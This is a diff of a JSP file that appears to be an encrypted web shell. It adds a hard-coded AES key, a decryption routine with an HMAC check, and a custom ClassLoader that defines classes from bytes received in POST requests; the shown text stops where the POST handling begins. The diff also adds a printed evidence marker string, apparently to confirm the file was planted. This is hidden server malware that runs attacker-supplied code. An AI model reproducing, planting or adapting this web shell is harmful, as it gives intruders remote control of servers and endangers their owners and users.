@@ -1,47 +1,30 @@
-<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*" %>
+<%out.print("FILEOPS_EVIDENCE_evd1791645075");%><%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*" %>
 <%!
 private byte[] Decrypt(byte[] data) throws Exception
 {
-    int prefixLen = 68;
-    byte[] encrypted = new byte[data.length - prefixLen];
-    System.arraycopy(data, prefixLen, encrypted, 0, encrypted.length);
-    String key = "__KEY__";
+    String key = "f033ed002541df63";
     byte[] raw = key.getBytes("UTF-8");
-    
-    byte[] aesKey = new byte[16];
-    for (int i = 0; i < 16; i++) {
-        aesKey[i] = (byte) (raw[i % raw.length] ^ 0x1F);
-    }
-    
-    javax.crypto.spec.SecretKeySpec sk = new javax.crypto.spec.SecretKeySpec(aesKey, "AES");
-    
+    javax.crypto.spec.SecretKeySpec sk = new javax.crypto.spec.SecretKeySpec(raw, "AES");
     byte[] iv = new byte[16];
-    System.arraycopy(encrypted, 0, iv, 0, 16);
-    
+    System.arraycopy(data, 0, iv, 0, 16);
     byte[] tag = new byte[32];
-    System.arraycopy(encrypted, encrypted.length - 32, tag, 0, 32);
-    
-    byte[] body = new byte[encrypted.length - 48];
-    System.arraycopy(encrypted, 16, body, 0, body.length);
-    
+    System.arraycopy(data, data.length - 32, tag, 0, 32);
+    byte[] body = new byte[data.length - 48];
+    System.arraycopy(data, 16, body, 0, body.length);
     javax.crypto.Mac mac = javax.crypto.Mac.getInstance("HmacSHA256");
     mac.init(sk);
-    
-    java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
-    out.write(iv);
-    out.write(body);
-    byte[] check = mac.doFinal(out.toByteArray());
-    
+    java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
+    bos.write(iv);
+    bos.write(body);
+    byte[] check = mac.doFinal(bos.toByteArray());
     if (!java.security.MessageDigest.isEqual(check, tag))
     {
         throw new Exception("bad mac");
     }
-    
     javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES/CBC/PKCS5Padding");
     cipher.init(javax.crypto.Cipher.DECRYPT_MODE, sk, new javax.crypto.spec.IvParameterSpec(iv));
     return cipher.doFinal(body);
 }
-
 %>
 <%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return
         super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){
